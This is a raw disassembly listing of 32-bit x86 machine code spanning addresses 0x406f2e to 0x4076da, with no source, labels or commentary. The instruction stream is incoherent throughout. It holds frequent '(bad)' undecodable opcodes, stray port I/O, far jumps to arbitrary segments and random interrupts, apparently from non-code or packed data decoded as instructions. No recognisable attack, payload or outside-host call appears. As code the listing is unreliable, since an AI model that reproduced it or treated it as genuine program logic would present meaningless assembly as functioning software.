  406f2e:	mov    cl,0x1e
  406f30:	cmp    DWORD PTR [ecx+esi*2+0x7],edx
  406f34:	pop    es
  406f35:	loope  0x406ee2
  406f37:	outs   dx,DWORD PTR ds:[esi]
  406f38:	dec    ecx
  406f39:	loopne 0x406f5c
  406f3b:	xchg   ecx,eax
  406f3c:	sub    eax,DWORD PTR [esp+ecx*8+0x17]
  406f40:	inc    esp
  406f41:	nop
  406f42:	inc    esi
  406f43:	fistp  WORD PTR [edx]
  406f45:	mov    edi,0xc9139912
  406f4a:	test   eax,0xd10acaa6
  406f4f:	(bad)  
  406f50:	int3   
  406f51:	ss std 
  406f53:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406f54:	inc    esp
  406f55:	mov    ebx,0x6ff80dd1
  406f5a:	jmp    0x102f:0xc2cd057e
  406f61:	shl    BYTE PTR [edx-0x5b],1
  406f64:	push   edx
  406f65:	mov    edi,0x263ea75e
  406f6a:	jg     0x406f03
  406f6c:	rol    ebx,1
  406f6e:	lock repnz mov edi,0xe13ae2f1
  406f75:	pop    esi
  406f76:	out    dx,al
  406f77:	lea    ebx,[ecx+0x27]
  406f7a:	fldz   
  406f7c:	mov    al,ds:0xa22b356
  406f81:	aam    0xbb
  406f83:	add    DWORD PTR [edi],edx
  406f85:	aas    
  406f86:	or     al,0x7e
  406f88:	rcr    DWORD PTR [eax-0x1345c0cc],cl
  406f8e:	mov    WORD PTR [esi+0x8bb576e],fs
  406f94:	pop    ss
  406f95:	or     DWORD PTR [edx],esi
  406f97:	dec    ebx
  406f98:	sub    al,0x9b
  406f9a:	dec    esi
  406f9b:	jo     0x406fdb
  406f9d:	jae    0x406fa0
  406f9f:	xor    esp,edx
  406fa1:	push   esp
  406fa2:	and    edx,DWORD PTR [ebp+0x71]
  406fa5:	push   esi
  406fa6:	xor    ah,BYTE PTR [ecx+0x6]
  406fa9:	add    DWORD PTR ds:0x3fadf09c,esp
  406faf:	imul   ebp,DWORD PTR [edx-0x11],0xffffffd3
  406fb3:	(bad)  
  406fb4:	imul   ebx,DWORD PTR [ebx-0x50],0xffffffa3
  406fb8:	ret    
  406fb9:	stos   DWORD PTR es:[edi],eax
  406fba:	adc    edi,ebp
  406fbc:	push   ss
  406fbd:	jae    0x406fd9
  406fbf:	test   al,0x86
  406fc1:	test   bh,al
  406fc3:	mov    eax,0x92d9995
  406fc8:	push   eax
  406fc9:	aam    0xd7
  406fcb:	out    dx,eax
  406fcc:	mov    bh,0xc8
  406fce:	inc    edi
  406fcf:	push   cs
  406fd0:	jno    0x407040
  406fd2:	add    eax,0xdb00b45a
  406fd7:	xor    al,0x69
  406fd9:	push   0xbbe34cc1
  406fde:	(bad)  
  406fdf:	mov    WORD PTR [ebp-0x50679057],cs
  406fe5:	push   edi
  406fe6:	mov    edx,0x25a79492
  406feb:	(bad)  
  406fed:	sbb    dh,BYTE PTR [edx+0x19ad5e2e]
  406ff3:	cli    
  406ff4:	lds    ebx,FWORD PTR [eax]
  406ff6:	bound  ebx,QWORD PTR ds:0x8fe32940
  406ffc:	mov    ds:0xe8df1c0b,al
  407001:	popf   
  407002:	and    al,0xc4
  407004:	and    ah,BYTE PTR cs:[esp+edx*4+0x31]
  407009:	sub    ebp,0x56e44c2c
  40700f:	cs pop esi
  407011:	and    ch,cl
  407013:	(bad)  
  407014:	scas   eax,DWORD PTR es:[edi]
  407015:	lods   al,BYTE PTR ds:[esi]
  407016:	repnz cmp BYTE PTR [esi+0x28a127d],ch
  40701d:	hlt    
  40701e:	push   ebx
  40701f:	xchg   esp,eax
  407020:	gs and al,0xc3
  407023:	pxor   mm1,QWORD PTR [ebp+0x43]
  407027:	jle    0x406fc6
  407029:	cmp    DWORD PTR [ebp+0x78ac1cf],ecx
  40702f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407030:	lds    ebx,FWORD PTR [edi]
  407032:	jl     0x406ffd
  407034:	test   eax,0x2205ce6c
  407039:	and    esp,ebx
  40703b:	xchg   esp,eax
  40703c:	jmp    0x406fef
  40703e:	xlat   BYTE PTR ds:[ebx]
  40703f:	pop    eax
  407040:	jae    0x407057
  407042:	jl     0x40706b
  407044:	adc    al,0xec
  407046:	aam    0x84
  407048:	daa    
  407049:	cmc    
  40704a:	ins    BYTE PTR es:[edi],dx
  40704b:	(bad)  
  40704c:	aas    
  40704d:	xchg   edx,eax
  40704e:	jb     0x40700f
  407050:	xor    eax,0xa7623d7a
  407055:	lock jmp 0x3a7f9ad6
  40705b:	cmp    esp,esi
  40705d:	mov    dl,0x89
  40705f:	ins    BYTE PTR es:[edi],dx
  407060:	pushf  
  407061:	or     eax,0xa9acc4f4
  407066:	xchg   edx,eax
  407067:	cdq    
  407068:	mov    ecx,0x939174ac
  40706d:	xchg   esi,eax
  40706e:	jge    0x407094
  407070:	add    BYTE PTR [ecx],0x9d
  407073:	dec    ebp
  407074:	sbb    al,0x90
  407076:	push   ebp
  407077:	jecxz  0x4070f7
  407079:	jg     0x4070a3
  40707b:	add    al,0xd9
  40707d:	adc    cl,cl
  40707f:	xchg   edi,eax
  407080:	ja     0x407042
  407082:	ja     0x4070f2
  407084:	cmp    al,0x73
  407086:	loope  0x407077
  407088:	clc    
  407089:	push   edi
  40708a:	mov    esi,0xbd9cf57f
  40708f:	cld    
  407090:	sub    ebp,edx
  407092:	or     eax,0x8acd1cc7
  407097:	sub    esp,ebp
  407099:	xor    al,0x12
  40709b:	nop
  40709c:	pushf  
  40709d:	mov    dh,0xfa
  40709f:	sahf   
  4070a0:	popa   
  4070a1:	dec    ecx
  4070a2:	or     al,0x5f
  4070a4:	shr    BYTE PTR [ebp+edx*8-0x1a],0x3a
  4070a9:	push   esp
  4070aa:	loope  0x407092
  4070ac:	mov    dh,BYTE PTR [ebx+0x6]
  4070af:	mov    esi,0x1983ef6d
  4070b4:	add    ebp,DWORD PTR [edx-0x1e2491c0]
  4070ba:	push   es
  4070bb:	sbb    ebx,eax
  4070bd:	xchg   dx,ax
  4070bf:	mov    ebp,0x8f832e6c
  4070c4:	out    0x70,al
  4070c6:	cmp    al,0x9c
  4070c8:	sub    ecx,esp
  4070ca:	sti    
  4070cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4070cc:	fstp   TBYTE PTR [edx]
  4070ce:	jo     0x4070fc
  4070d0:	xor    eax,0xa553cd9f
  4070d5:	push   es
  4070d6:	out    0x55,eax
  4070d8:	cdq    
  4070d9:	mov    al,0x24
  4070db:	xchg   al,ch
  4070dd:	int    0xae
  4070df:	mov    dh,BYTE PTR [edi-0x14]
  4070e2:	and    dh,BYTE PTR [edx]
  4070e4:	pop    eax
  4070e5:	outs   dx,DWORD PTR ds:[esi]
  4070e6:	std    
  4070e7:	and    ecx,ecx
  4070e9:	pop    ecx
  4070ea:	mov    al,0x2b
  4070ec:	nop
  4070ed:	test   al,0x27
  4070ef:	div    BYTE PTR [ebx+0x1da4031a]
  4070f5:	cwde   
  4070f6:	sbb    bh,al
  4070f8:	and    dh,BYTE PTR [ecx+0x512e3117]
  4070fe:	lahf   
  4070ff:	mov    DWORD PTR [eax-0x679a030c],edx
  407105:	xchg   esi,ecx
  407107:	sbb    ebx,DWORD PTR [edi+0x3375a0a5]
  40710d:	adc    BYTE PTR [edi+edx*8+0x34],ah
  407111:	xchg   edi,eax
  407112:	mov    ds:0xbf4b71e9,eax
  407117:	xor    BYTE PTR [esi-0x34],dh
  40711a:	out    dx,al
  40711b:	mov    dh,BYTE PTR [ecx+0x60e315bc]
  407121:	add    ch,cl
  407123:	or     edx,DWORD PTR [ecx]
  407125:	push   edx
  407126:	retf   
  407127:	mov    cl,0xbd
  407129:	test   eax,0x7810b441
  40712e:	mov    esi,0xd138b941
  407133:	test   bl,0xa1
  407136:	xor    dh,bl
  407138:	and    eax,eax
  40713a:	pextrw edx,(bad),0xc5
  40713c:	push   ecx
  40713d:	xor    al,0xe3
  40713f:	sbb    ah,dl
  407141:	cmp    bl,dh
  407143:	sbb    eax,0x34afeb4c
  407148:	dec    eax
  407149:	scas   al,BYTE PTR es:[edi]
  40714a:	adc    ebx,esp
  40714c:	repz jecxz 0x40714b
  40714f:	lea    ebp,[ebp-0x1e]
  407152:	xchg   ch,cl
  407154:	pop    ebp
  407155:	mov    BYTE PTR [eax-0x7e700ec0],bl
  40715b:	pusha  
  40715c:	mov    dh,0xee
  40715e:	sub    al,0xb9
  407160:	cdq    
  407161:	data16 and BYTE PTR [eax],al
  407164:	cmc    
  407165:	loope  0x4071ab
  407167:	call   0xd286:0xe28b451
  40716e:	(bad)  [edi]
  407170:	sbb    cl,BYTE PTR [ebp-0x2af4d400]
  407176:	jl     0x407109
  407178:	in     eax,dx
  407179:	add    eax,0x142c812b
  40717e:	outs   dx,DWORD PTR ds:[esi]
  40717f:	jne    0x4071ff
  407181:	and    bh,dh
  407183:	leave  
  407184:	arpl   WORD PTR [edx+eiz*1+0x93a2944],ax
  40718b:	inc    BYTE PTR [esi+eiz*2-0x5c813dd8]
  407192:	mov    edi,0x760ed20a
  407197:	in     eax,dx
  407198:	popf   
  407199:	stos   BYTE PTR es:[edi],al
  40719a:	sub    ch,dl
  40719c:	inc    ebp
  40719d:	test   al,al
  40719f:	xchg   ebx,eax
  4071a0:	push   ebx
  4071a1:	dec    edi
  4071a2:	data16 jp 0x4071cc
  4071a5:	cld    
  4071a6:	push   0xfffffff5
  4071a8:	in     al,dx
  4071a9:	push   0x3fa51b7
  4071ae:	xor    al,0x6a
  4071b0:	loopne 0x407137
  4071b2:	gs pop ecx
  4071b4:	pop    ds
  4071b5:	cdq    
  4071b6:	add    eax,0x8c281987
  4071bb:	cdq    
  4071bc:	in     eax,0xae
  4071be:	imul   ebx
  4071c0:	push   ss
  4071c1:	push   0xcda55412
  4071c6:	(bad)  
  4071c7:	sbb    al,0x93
  4071c9:	and    dh,dh
  4071cb:	fild   DWORD PTR [ebx-0x2b4c8e97]
  4071d1:	push   es
  4071d2:	(bad)  
  4071d3:	les    ebx,FWORD PTR [ebx]
  4071d5:	inc    ecx
  4071d6:	in     eax,0x4f
  4071d8:	pop    ebx
  4071d9:	xchg   edx,edx
  4071db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4071dc:	xchg   esp,eax
  4071dd:	shr    DWORD PTR [ebp+0x737eb4b8],0x26
  4071e4:	repz loop 0x40723c
  4071e7:	adc    ah,dh
  4071e9:	cld    
  4071ea:	out    dx,al
  4071eb:	stos   DWORD PTR es:[edi],eax
  4071ec:	(bad)  
  4071ee:	jns    0x40725e
  4071f0:	mov    esi,0xe12c5577
  4071f5:	in     al,dx
  4071f6:	fwait
  4071f7:	push   eax
  4071f8:	imul   ebx,DWORD PTR [ebx+0x4c],0x9d16cfc1
  4071ff:	mov    bl,0x36
  407201:	jnp    0x407234
  407203:	cmp    al,0x24
  407205:	retf   
  407206:	ss in  eax,dx
  407208:	clc    
  407209:	add    al,0x4
  40720b:	aam    0xe3
  40720d:	push   ebx
  40720e:	cmc    
  40720f:	ins    BYTE PTR es:[edi],dx
  407210:	idiv   bl
  407212:	pop    ecx
  407213:	js     0x4071bf
  407215:	iret   
  407216:	aas    
  407217:	adc    al,0x14
  407219:	mov    ecx,0x2bf4879f
  40721e:	mov    bh,0xae
  407220:	test   BYTE PTR [esi],ah
  407222:	push   ss
  407223:	xlat   BYTE PTR ds:[ebx]
  407225:	mov    ah,0x39
  407227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407228:	inc    eax
  407229:	fist   WORD PTR [edi+0x44c78e5e]
  40722f:	(bad)  
  407230:	cwde   
  407231:	(bad)  
  407232:	int3   
  407233:	test   cl,ch
  407235:	jecxz  0x40722a
  407237:	ror    BYTE PTR [ebx-0x3e75a16f],0xf1
  40723e:	or     al,BYTE PTR [ebx-0x12]
  407241:	adc    dh,BYTE PTR [ecx]
  407243:	mov    cl,0x82
  407245:	retf   0xbe
  407248:	aaa    
  407249:	sbb    eax,0xcf7f1c61
  40724e:	stos   DWORD PTR es:[edi],eax
  40724f:	or     BYTE PTR [ebx+eiz*1-0x63],bh
  407253:	int3   
  407254:	stos   DWORD PTR es:[edi],eax
  407255:	push   ss
  407256:	lea    esp,[esp+ecx*2+0x40]
  40725a:	aaa    
  40725b:	push   0xffffffb0
  40725d:	stc    
  40725e:	(bad)  
  40725f:	sahf   
  407260:	ds xlat BYTE PTR gs:[ebx]
  407263:	mov    ebx,0x62398c10
  407268:	sbb    eax,0xb08037e
  40726d:	(bad)  
  40726f:	push   edx
  407270:	or     eax,0xfffffffd
  407273:	pop    eax
  407274:	jle    0x407247
  407276:	retf   
  407277:	adc    BYTE PTR [edi-0x46],dh
  40727a:	popf   
  40727b:	inc    edx
  40727c:	cmp    al,0xc9
  40727e:	fs xchg esp,eax
  407280:	fmul   st(5),st
  407282:	aad    0xea
  407284:	dec    ebx
  407285:	cs test al,0x15
  407288:	adc    al,0xbf
  40728a:	mov    ebx,0xd4564062
  40728f:	fdivr  DWORD PTR [ebx]
  407291:	xchg   DWORD PTR [edx+0x69bee720],esi
  407297:	xchg   ecx,eax
  407298:	out    0x63,eax
  40729a:	inc    ebp
  40729b:	and    DWORD PTR [esi],esi
  40729d:	das    
  40729e:	add    bl,ah
  4072a0:	and    al,0xa4
  4072a2:	pop    eax
  4072a3:	or     eax,0xa665cd1d
  4072a8:	test   al,0x3b
  4072aa:	push   ebp
  4072ab:	jo     0x4072f1
  4072ad:	enter  0x305f,0x72
  4072b1:	dec    ebx
  4072b2:	ret    
  4072b3:	push   edx
  4072b4:	mov    ch,0x38
  4072b6:	rcl    BYTE PTR [edx*1-0x4f30b23],cl
  4072bd:	lods   eax,DWORD PTR ds:[esi]
  4072be:	in     eax,dx
  4072bf:	jns    0x407285
  4072c1:	popa   
  4072c2:	sub    bl,BYTE PTR [edx-0x27]
  4072c5:	push   edi
  4072c6:	cmp    al,0xaf
  4072c8:	add    al,0x7f
  4072ca:	mov    esi,0x2caf97a2
  4072cf:	inc    ebp
  4072d0:	pop    esp
  4072d1:	push   edi
  4072d2:	lahf   
  4072d3:	push   eax
  4072d4:	pop    esi
  4072d5:	sbb    BYTE PTR [esi],bl
  4072d7:	jp     0x407280
  4072d9:	xchg   DWORD PTR [edx+0x25],edx
  4072dc:	and    eax,0xc57800ad
  4072e1:	shl    DWORD PTR [ecx],cl
  4072e3:	sbb    bh,BYTE PTR [ecx-0x7a]
  4072e6:	jb     0x4072d3
  4072e8:	shl    al,cl
  4072ea:	scas   eax,DWORD PTR es:[edi]
  4072eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072ec:	mov    ds:0xf4f7f25a,al
  4072f1:	out    0x3f,al
  4072f3:	mov    dl,0x51
  4072f5:	mov    BYTE PTR [edi+0x32],ah
  4072f8:	popf   
  4072f9:	jb     0x4072e1
  4072fb:	push   ss
  4072fc:	fadd   QWORD PTR [esi]
  4072fe:	inc    esp
  4072ff:	xlat   BYTE PTR ds:[ebx]
  407300:	jno    0x40734e
  407302:	fwait
  407303:	iret   
  407304:	addr16 push 0xffffffd8
  407307:	loopne 0x407341
  407309:	ja     0x407323
  40730b:	xchg   esi,eax
  40730c:	add    al,0xeb
  40730e:	out    dx,eax
  40730f:	pop    ds
  407310:	je     0x4072c8
  407312:	(bad)  
  407313:	std    
  407314:	dec    edx
  407315:	jge    0x4072c4
  407317:	lahf   
  407318:	out    dx,eax
  407319:	dec    ebp
  40731a:	cmp    eax,0x8c393b18
  40731f:	and    BYTE PTR [esi],dh
  407321:	mov    cl,0xb2
  407323:	jmp    0xe91f:0x1a2a3ba7
  40732a:	push   0xdd3da9bd
  40732f:	push   ecx
  407330:	fadd   st(0),st
  407332:	sbb    eax,0x1b0728bf
  407337:	addr16 pop edx
  407339:	xor    DWORD PTR [ecx+ecx*8+0x45],ecx
  40733d:	or     al,0x82
  40733f:	je     0x40739d
  407341:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407342:	daa    
  407343:	hlt    
  407344:	stc    
  407345:	enter  0x24c4,0xd1
  407349:	cdq    
  40734a:	jo     0x40732c
  40734c:	jmp    0x3d5869db
  407351:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407352:	push   es
  407353:	imul   edx,DWORD PTR [eax+ebx*2+0x7021543d],0x2b
  40735b:	loop   0x40736f
  40735d:	jb     0x40734b
  40735f:	ret    
  407360:	push   0x22
  407362:	mov    esi,0xa22d1a91
  407367:	and    al,0x2
  407369:	test   eax,0xcf7da61e
  40736e:	fld    TBYTE PTR [ecx-0x31cad18a]
  407374:	in     eax,dx
  407375:	inc    esp
  407376:	call   DWORD PTR [edx]
  407378:	mov    ecx,DWORD PTR [esi+0xc]
  40737b:	jecxz  0x407322
  40737d:	lods   al,BYTE PTR ds:[esi]
  40737e:	leave  
  40737f:	dec    eax
  407380:	pushf  
  407381:	aam    0x9f
  407383:	lods   al,BYTE PTR ds:[esi]
  407384:	dec    edx
  407385:	cmp    eax,0xad419dbf
  40738a:	es mov ah,0x2c
  40738d:	jmp    0x61a0:0x62c22109
  407394:	inc    edi
  407395:	into   
  407396:	or     DWORD PTR [ecx+ecx*1-0x54],0xfffffffe
  40739b:	or     esi,DWORD PTR [edi+0x3c771076]
  4073a1:	in     eax,dx
  4073a2:	pusha  
  4073a3:	icebp  
  4073a4:	test   DWORD PTR [edi],ebx
  4073a6:	mov    esp,0x7f11a2fd
  4073ab:	or     eax,0x81d23ef6
  4073b0:	fs int 0xdf
  4073b3:	int3   
  4073b4:	dec    eax
  4073b5:	in     eax,0x2d
  4073b7:	mov    edx,0xc43dc4ca
  4073bc:	xchg   BYTE PTR [ebp-0x660f2f4b],bh
  4073c2:	jmp    0xb82065f7
  4073c7:	ins    BYTE PTR es:[edi],dx
  4073c8:	mov    ds:0xde9021cf,al
  4073cd:	inc    esi
  4073ce:	pop    ecx
  4073cf:	mov    ecx,ecx
  4073d1:	pop    ss
  4073d2:	test   DWORD PTR [esi-0x7508fd7],eax
  4073d8:	out    dx,eax
  4073d9:	out    0xc2,eax
  4073db:	test   eax,0x806c026d
  4073e0:	sar    ebp,1
  4073e2:	push   0xf44d59ea
  4073e7:	call   0x17cd64fc
  4073ec:	cmp    eax,0x2d3d1cb5
  4073f1:	mov    ch,0xbe
  4073f3:	pop    esi
  4073f4:	shl    BYTE PTR [esi],1
  4073f6:	mov    dl,0x24
  4073f8:	addr16 jns 0x40738d
  4073fb:	xor    DWORD PTR ds:0xef9770ce,ebp
  407401:	or     eax,0x9db74aa4
  407406:	out    dx,eax
  407407:	pop    ebp
  407408:	fcomp  QWORD PTR [edx-0x48]
  40740b:	int3   
  40740c:	xchg   esi,eax
  40740d:	push   edx
  40740e:	sub    DWORD PTR [edi+0x12],ebx
  407411:	cmp    BYTE PTR [eax],bl
  407413:	scas   al,BYTE PTR es:[edi]
  407414:	mov    ss,WORD PTR [edx+0x788fabbc]
  40741a:	test   esi,edi
  40741c:	xlat   BYTE PTR ds:[ebx]
  40741d:	int    0x3f
  40741f:	push   ebx
  407420:	jp     0x407442
  407422:	mov    edi,0x54086c8a
  407427:	mov    edi,0xf565f4c8
  40742c:	inc    edi
  40742d:	stos   DWORD PTR es:[edi],eax
  40742e:	bound  edi,QWORD PTR [edi+0x7e]
  407431:	and    BYTE PTR [ecx-0xb],bl
  407434:	jg     0x40746b
  407436:	add    BYTE PTR [edi-0x24d5a356],ah
  40743c:	dec    edx
  40743d:	fimul  WORD PTR [ebp-0x60]
  407440:	cmp    al,ah
  407442:	test   BYTE PTR [ecx+0x350df821],ah
  407448:	add    eax,0xe8f44544
  40744d:	mov    ds:0x41be1c0e,eax
  407452:	js     0x4073da
  407454:	shl    DWORD PTR [ebx+0x2f],0xee
  407458:	add    dl,bl
  40745a:	mov    ebp,0xa6fe4b94
  40745f:	daa    
  407460:	enter  0xf1d2,0xd6
  407464:	mov    ecx,DWORD PTR [edi-0x34]
  407467:	(bad)  
  407468:	xchg   edi,eax
  407469:	iret   
  40746a:	xor    DWORD PTR [edi],eax
  40746c:	in     eax,dx
  40746d:	push   eax
  40746e:	jge    0x4074b5
  407470:	mov    WORD PTR [esp+ecx*8],?
  407473:	inc    ebx
  407474:	cmp    ebp,DWORD PTR [ebx+0x3e]
  407477:	pop    ebx
  407478:	jno    0x407429
  40747a:	gs pushf 
  40747c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40747d:	cmp    ch,BYTE PTR [eax]
  40747f:	sub    ebp,0xf8527ecc
  407485:	lods   al,BYTE PTR ds:[esi]
  407486:	xchg   ebx,eax
  407487:	xchg   edx,eax
  407488:	mov    dh,0x36
  40748a:	push   eax
  40748b:	aaa    
  40748c:	into   
  40748d:	popf   
  40748e:	arpl   sp,di
  407490:	mov    eax,0x6ac52167
  407495:	int3   
  407496:	cmp    dl,BYTE PTR ds:[ecx+0x6]
  40749a:	pop    ebx
  40749b:	mov    esp,0x15757d21
  4074a0:	or     al,0xe
  4074a2:	repz inc esi
  4074a4:	mov    ebp,DWORD PTR [edi+0x16125e7]
  4074aa:	inc    esp
  4074ab:	xor    edx,eax
  4074ad:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  4074af:	aam    0x0
  4074b1:	adc    esp,edi
  4074b3:	ss jo  0x407500
  4074b6:	xchg   esi,eax
  4074b7:	repz ror DWORD PTR [ecx],0xe1
  4074bb:	pop    eax
  4074bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4074bd:	daa    
  4074be:	mov    ecx,0x19e86fff
  4074c3:	jge    0x407474
  4074c5:	and    al,BYTE PTR [ecx]
  4074c7:	shr    DWORD PTR [edi+0x29],0x99
  4074cb:	lahf   
  4074cc:	adc    ebp,DWORD PTR [edi-0x2f]
  4074cf:	mov    eax,ds:0x967a639
  4074d4:	stos   DWORD PTR es:[edi],eax
  4074d5:	jbe    0x407482
  4074d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074d8:	int    0x88
  4074da:	cli    
  4074db:	rcr    BYTE PTR [esi+edx*1],cl
  4074de:	jle    0x407472
  4074e0:	xchg   esp,eax
  4074e1:	cli    
  4074e2:	jbe    0x407541
  4074e4:	fcomp  DWORD PTR [edi-0x415656bc]
  4074ea:	fbld   TBYTE PTR [ebx]
  4074ec:	stos   DWORD PTR es:[edi],eax
  4074ed:	mov    WORD PTR [esi],ss
  4074ef:	jbe    0x40750a
  4074f1:	jle    0x407479
  4074f3:	push   0x49f41489
  4074f8:	not    BYTE PTR [ebp+0x29]
  4074fb:	rol    BYTE PTR [ebx-0x8],0xb9
  4074ff:	int    0x89
  407501:	or     eax,0xb0835ca0
  407506:	or     eax,0xc9717580
  40750b:	xor    eax,0xeed28751
  407510:	dec    ebx
  407511:	and    BYTE PTR [eax-0x66da49b1],bh
  407517:	push   edx
  407518:	sub    BYTE PTR [edx-0xa],cl
  40751b:	xchg   ebp,eax
  40751c:	arpl   WORD PTR [edi-0x66a9bcac],bp
  407522:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407523:	cmp    bh,cl
  407525:	add    BYTE PTR [ecx-0x8],bh
  407528:	inc    ecx
  40752a:	in     eax,dx
  40752b:	pop    eax
  40752c:	ror    DWORD PTR [edx+ebx*8-0xa2c2b4],1
  407533:	and    ebp,DWORD PTR [edx+0x4a7557b9]
  407539:	jb     0x40753d
  40753b:	fs cmp al,0xe4
  40753e:	(bad)  
  40753f:	mov    bl,0x55
  407541:	mov    bh,0xf
  407543:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407544:	daa    
  407545:	xchg   edi,eax
  407546:	scas   ax,WORD PTR es:[edi]
  407548:	fiadd  WORD PTR [ecx-0x15fc2598]
  40754e:	pop    esi
  40754f:	add    DWORD PTR ds:0x4c2f9a48,ebx
  407555:	mov    ecx,0xc30664fe
  40755a:	mov    esi,0xc804c3a8
  40755f:	mov    ds:0xce596dec,al
  407564:	leave  
  407565:	xor    ecx,DWORD PTR [edi-0x18]
  407568:	sahf   
  407569:	or     eax,0x3ace0919
  40756e:	ds in  al,dx
  407570:	sbb    eax,0x8a75b748
  407575:	out    0x36,eax
  407577:	fs or  eax,0x497f359f
  40757d:	loopne 0x40758a
  40757f:	pop    ds
  407580:	sub    BYTE PTR [esi-0x3dd44bdb],0x7d
  407587:	xchg   esp,eax
  407588:	(bad)  
  407589:	pop    esp
  40758a:	pusha  
  40758b:	and    dl,BYTE PTR [edx-0x34]
  40758e:	push   0x37
  407590:	push   0x96116160
  407595:	jl     0x407552
  407597:	dec    ecx
  407598:	enter  0x1d36,0xa6
  40759c:	mov    dh,0x9e
  40759e:	jecxz  0x40758f
  4075a0:	fnstenv [edi-0x7a]
  4075a3:	cld    
  4075a4:	std    
  4075a5:	cmc    
  4075a6:	xchg   edx,eax
  4075a7:	push   es
  4075a8:	inc    edi
  4075a9:	inc    ecx
  4075aa:	cmp    al,0x10
  4075ac:	inc    ecx
  4075ad:	jns    0x407602
  4075af:	pop    edi
  4075b0:	dec    esp
  4075b1:	push   ds
  4075b2:	les    ecx,FWORD PTR ds:0x9c957f8c
  4075b8:	fwait
  4075b9:	mov    cl,BYTE PTR [ebx]
  4075bb:	pusha  
  4075bc:	(bad)  
  4075bd:	push   edx
  4075be:	scas   al,BYTE PTR es:[edi]
  4075bf:	les    eax,FWORD PTR [edi+0x3cea6840]
  4075c5:	dec    edx
  4075c6:	cdq    
  4075c7:	rol    DWORD PTR [ecx],0x56
  4075ca:	sbb    ebx,DWORD PTR [ecx-0x5c]
  4075cd:	call   0x5f2ac9a
  4075d2:	jne    0x4075c4
  4075d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075d5:	add    al,0x4
  4075d7:	sar    bh,cl
  4075d9:	test   eax,0xb20bdaec
  4075de:	sub    al,0x41
  4075e0:	xchg   esp,eax
  4075e1:	pop    esi
  4075e2:	lods   al,BYTE PTR ds:[esi]
  4075e3:	lods   al,BYTE PTR ds:[esi]
  4075e4:	call   0xe48f5c53
  4075e9:	mov    DWORD PTR [esi+0x78],ebx
  4075ec:	scas   al,BYTE PTR es:[edi]
  4075ed:	jge    0x40763b
  4075ef:	icebp  
  4075f0:	xchg   ebx,eax
  4075f1:	push   ds
  4075f2:	addr16 out dx,al
  4075f4:	retf   0xe37
  4075f7:	jg     0x40766f
  4075f9:	mov    gs,WORD PTR [eax+0x1ba42854]
  4075ff:	in     eax,dx
  407600:	imul   edx,DWORD PTR [edx-0x4be25ee1],0x48
  407607:	push   es
  407608:	dec    esp
  407609:	sahf   
  40760a:	leave  
  40760b:	push   es
  40760c:	repnz xor eax,0x85c4d79e
  407612:	jmp    0x4075cd
  407614:	mov    bh,0xa0
  407616:	and    ebx,DWORD PTR [eax]
  407618:	aad    0xb8
  40761a:	inc    edx
  40761b:	dec    ecx
  40761c:	inc    edi
  40761d:	jb     0x40767e
  40761f:	imul   ebx,DWORD PTR ds:0x8d8123ad,0x5
  407626:	cld    
  407627:	or     BYTE PTR [esi],0x5b
  40762a:	and    eax,0xd59bd6db
  40762f:	ins    DWORD PTR es:[edi],dx
  407630:	test   DWORD PTR [ecx],0xeaa55760
  407636:	adc    edx,DWORD PTR [ebx-0x781c22a7]
  40763c:	pop    esp
  40763d:	iret   
  40763e:	imul   ebx,DWORD PTR [eax],0xbef1f063
  407644:	fcom   DWORD PTR [eax+0x59]
  407647:	lds    edi,FWORD PTR [edi]
  407649:	popa   
  40764a:	repz into 
  40764c:	dec    ecx
  40764d:	or     esp,DWORD PTR [ebx-0x312acc4a]
  407653:	xchg   esp,eax
  407654:	stos   BYTE PTR es:[edi],al
  407655:	scas   al,BYTE PTR es:[edi]
  407656:	inc    ecx
  407657:	inc    esi
  407658:	cld    
  407659:	iret   
  40765a:	mov    WORD PTR [ecx+0x23ad2c9b],gs
  407660:	mov    al,BYTE PTR [ecx+0x1009ce95]
  407666:	mov    edi,0x5884a718
  40766b:	add    edx,DWORD PTR [eax+0x15]
  40766e:	sub    ebx,DWORD PTR [eax]
  407670:	loope  0x407626
  407672:	and    al,0x43
  407674:	adc    al,0x82
  407676:	push   ebx
  407677:	sub    BYTE PTR [esi-0x6a],dl
  40767a:	scas   eax,DWORD PTR es:[edi]
  40767b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40767c:	adc    bh,ch
  40767e:	lods   eax,DWORD PTR ds:[esi]
  40767f:	xchg   ecx,eax
  407680:	pop    ebx
  407681:	rcl    DWORD PTR [ebx+0x76],0x19
  407685:	ds adc eax,0x577f0d2
  40768b:	jmp    DWORD PTR [eax+0x72cd2f78]
  407691:	ja     0x407667
  407693:	out    0x0,al
  407695:	sar    DWORD PTR [edi+ecx*1],1
  407698:	push   es
  407699:	jne    0x40771a
  40769b:	sub    eax,0x9ba4b048
  4076a0:	xchg   ebp,eax
  4076a1:	mov    cl,0x9a
  4076a3:	jnp    0x4076a2
  4076a5:	imul   edi,DWORD PTR [edx-0x40ffcd70],0xffffffae
  4076ac:	aad    0x94
  4076ae:	es aad 0x6e
  4076b1:	shr    BYTE PTR [ecx-0x68],cl
  4076b4:	(bad)  
  4076b5:	pushf  
  4076b6:	in     al,0x2f
  4076b8:	sbb    ebp,DWORD PTR [edx]
  4076ba:	jo     0x4076ba
  4076bc:	out    dx,al
  4076bd:	cs loope 0x40773c
  4076c0:	enter  0x7a1d,0x64
  4076c4:	adc    al,0x5b
  4076c6:	inc    esi
  4076c7:	bound  esp,QWORD PTR gs:[edi-0x2acefecf]
  4076ce:	xchg   edi,eax
  4076cf:	pop    ds
  4076d0:	or     BYTE PTR [esi+0x2300c9a2],0xcf
  4076d7:	push   esi
  4076d8:	xor    al,0x9e
  4076da:	inc    esi
